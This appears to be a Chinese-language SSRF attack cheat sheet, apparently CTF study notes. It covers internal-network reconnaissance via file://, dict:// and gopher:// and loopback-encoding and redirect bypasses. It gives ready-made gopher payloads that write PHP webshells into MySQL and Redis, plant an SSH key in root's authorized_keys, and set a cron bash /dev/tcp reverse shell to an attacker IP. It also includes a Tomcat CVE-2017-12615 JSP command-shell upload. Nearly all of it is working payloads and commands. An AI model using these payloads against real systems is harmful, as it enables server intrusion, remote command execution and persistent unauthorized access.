# ssrf

## 信息收集

- file:// 从文件系统中获取文件内容，如 file:///etc/passwd
- dict://字典服务协议，访问字典资源，如 dict:///ip:6739/info:
- ftp://可用于网络端口扫描
- sftp://SSH文件传输协议或安全文件传输协议
- Idap://轻量级目录访问协议
- tftp:// 简单文件传输协议
- gopher://分布式文档传递服务

### File伪协议

file:// 从文件系统中获取文件内容，格式为 file://[文件路径]

- `file:///etc/passwd`	读取文件passwd
- `file:///etc/hosts`	    显示当前操作系统网卡的IP
- `file:///proc/net/arp`	显示arp缓存表(寻找内网其他主机)
- `file:///proc/net/fib_trie`	显示当前网段路由信息

寻找内网其他主机步骤：

1. `file:///etc/hosts`找到当前操作系统网卡的IP

2. 根据IP格式，使用`burp suite` `intruder模块`爆破扫描

3. 访问`file:///proc/net/arp`，查看记录

### Dict伪协议

确认主机后进行端口扫描

url=dict://172.250.250.1:80

使用`burp suite` `intruder模块`爆破扫描

### Http伪协议

确认主机和开放端口后进行目录扫描

url=http://172.250.250.1:80/index.php

使用`burp suite` `intruder模块`字典爆破`index.php`的位置

## Gopher伪协议

`url=gopher://172.250.250.4:80/_` + 数据

数据进行两次URL编码

### GET请求

必须头部信息：

- GET路径
- Host目标IP地址
- 换行符`%0d%0a`

```http
GET /ssrf/index.php?name=benben HTTP/1.1
Host: 192.168.1.206:9091

```

进行两次URL编码

burp suite URL编码 换行符`%0d%0a`，一些工具转可能只有`%0a`

### POST请求

必须头部信息：

- POST路径
- Host目标IP地址
- Content-Type:
- Content-Length:
- 换行符`%0d%0a`
- 数据

```http
POST /ssrf/index.php HTTP/1.1
Host: 192.168.1.206:9091
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

data=data
```

这里`Content-Length`是`data=data`的长度

## 环回地址绕过

```
点分十进制
127.0.0.1
http://127.0.0.1/falg.php

32位bit二进制
0b 01111111000000000000000000000001
http://0b01111111000000000000000000000001/falg.php

八进制
0 17700000001
http://017700000001/falg.php
http://0177.0000.0000.0001/falg.php

十六进制
0x 7F000001
http://0x7F000001/falg.php
http://0x7F.0x00.0x00.0x01/falg.php
http://0x7F.0.0.1/falg.php

十进制（连续）
2130706433
http://2130706433/falg.php
```

更多的看ctfshow收录

## 302重定向绕过

```php
<?php
header('Location: http://127.0.0.1/falg.php');
```

## DNS重定向绕过

[DNS重绑定](https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg)

A 公网IP
B 私网IP

## 对mysql写入木马

```bash
python2 gopherus.py --exploit mysql
Give MySQL username: root
Give query to execute: select "<?php @eval($_POST['cmd']);?>" into outfile '/var/www/html/cmd.php';

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4d%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%63%6d%64%2e%70%68%70%27%3b%01%00%00%00%01
```

## 对tomcat写入木马

tomcat漏洞

CVE-2017-12615

任意文件上传

默认端口8080

```http
PUT /1.jsp HTTP/1.1
Host: ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0(compatible;MSIE9.0;Windows NT6.1;Win64;x64;Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 453

<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in = Runtime.getRuntime().exec(command).getInputStream();
        int a=-1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1)
        {
            sb.append(new String(b));
        }
        out.print("<pre>");
    }else{
        out.put("format: xxx.jsp?cmd=Command");
    }
%>
```

进行两次url编码

`url=gopher://172.250.250.4:80/_` + 数据

## 对redis写入木马

```bash
python2 gopherus.py --exploit redis

What do you want?? (ReverseShell/PHPShell): PHPShell

Give web root location of server (default is /var/www/html): 
Give PHP Payload (We have default PHP Shell): 

Your gopher link is Ready to get PHP Shell: 

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.
```

## 对redis写入ssh公钥

```bash
ssh-keygen -t rsa
# 生成密钥在/root/.ssh
┌──(root㉿kali)-[~/.ssh]
└─# ls
id_rsa  id_rsa.pub
```

```
url=gopher://172.250.250.4:80/_*4%0d%0A$6%0d%0Aconfig%0d%0A$3%0d%0Aset%0d%0A$3%0d%0Adir%0d%0A$11%0d%0A/root/.ssh/%0d%0A*4%0d%0A$6%0d%0Aconfig%0d%0A$3%0d%0Aset%0d%0A$10%0d%0Adbfilename%0d%0A$5%0d%0Aauthorized_keys%0d%0A*3%0d%0A$3%0d%0Aset%0d%0A$7%0d%0Apayload%0d%0A$566%0d%0A%0d%0A%0d%0Assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCou0w1mGCnz9gCyWn8CMxOSRgUo4k2wRduIf+vk5TkwOiD/wf08b6WcKEdDfurRG2UpgiAZkN3dJSazT9y8CNIQCxgqY2m8LYTTH9ADrzbmtjnWMGF0tXmCyvrrb9TDkQFUMv95W3YkRTwvZWplyCTfildaFESXXbxR2gNPB+oV1X4A69TV6j9TnW2Qo03zAKcXdFWJd0Dwm3rwPSxCfwX1MNcVOL0FdzqOXOC8j+kCO4uiemcEErL/cH7Ukw8eKQnRuTvNHHvhYnNssVrPfpHxH2Ojv9iXnKRd0oFpRVb2fwKRLQFDlG3FR0vUPqcxyWGehqYR6nvc3fUgRS9Yy4MdfsNpAhpwZr0/aSXjkKybUX47rqM2ZbWA5bPKCnmIQ3XpZLiUYzqEBdJ9ZIvQVLNnmxPCP1YTb9IPL7QrSzJYml2ug9y85ysSoR48ul4F4cknVGMuymgEKC0FooNfFzUoR+wge/TXJ6BWZzhYYWwFDB9cSa3VlleFrZNywR24ds= root@kali%0d%0A%0d%0A%0d%0A*1%0d%0A$4%0d%0Asave%0d%0A*1%0d%0A$4%0d%0Aquit
```

连接

```bash
ssh -i id_rsa -p 2222 root@192.168.233.137
```

-p 端口

root@主机IP

## 对redis反弹shell

```bash
python2 gopherus.py --exploit redis

What do you want?? (ReverseShell/PHPShell): ReverseShell

Give your IP Address to connect with victim through Revershell (default is 127.0.0.1): 192.168.233.140(本机IP监听用)
What can be his Crontab Directory location
## For debugging(locally) you can use /var/lib/redis : 

Your gopher link is ready to get Reverse Shell: 

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2470%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/192.168.233.140/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

Before sending request plz do `nc -lvp 1234`

-----------Made-by-SpyD3r-----------

```

本机监听

```bash
nc -lvp 1234
```

